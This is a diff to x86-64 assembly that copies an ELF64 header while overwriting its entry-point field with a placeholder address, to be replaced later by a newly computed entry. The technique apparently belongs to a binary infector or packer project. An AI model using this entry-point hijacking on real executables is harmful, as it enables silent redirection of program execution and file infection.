@@ -446,13 +446,31 @@ parse64elfheader:
 	push rdi
 	push rsi
 
+	sub rsp, 8; new entrypoint stocked here
+	;Copy the begining of Elf header till entry
 	mov rbx, rdi
 	mov rdi, rsi
 	mov rsi, rbx
-	mov rdx, 64 ; sizeof(Elf64_Ehdr)
+	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
 	mov rax, 1
 	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
-	
+	;Time to handle the entrypoint
+	mov QWORD[rsp], QWORD 0x41424344; change by rax after calling func to find new entry
+	add rsi, 32 ; points right after the entrypoint
+	mov rbx, rsi ; store rsi void *file+32
+	mov rsi, rsp
+	mov rdx, 8
+	mov rax, 1
+	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
+	;Copy the remainder of the elf header
+	mov rsi, rbx
+	mov rdx, 32
+	mov rax, 1
+	syscall; write(wfd, file +32, 32); copying everything after entrypoint
+
+
+	add rsp, 8
+
 	pop rsi
 	pop rdi
 retn
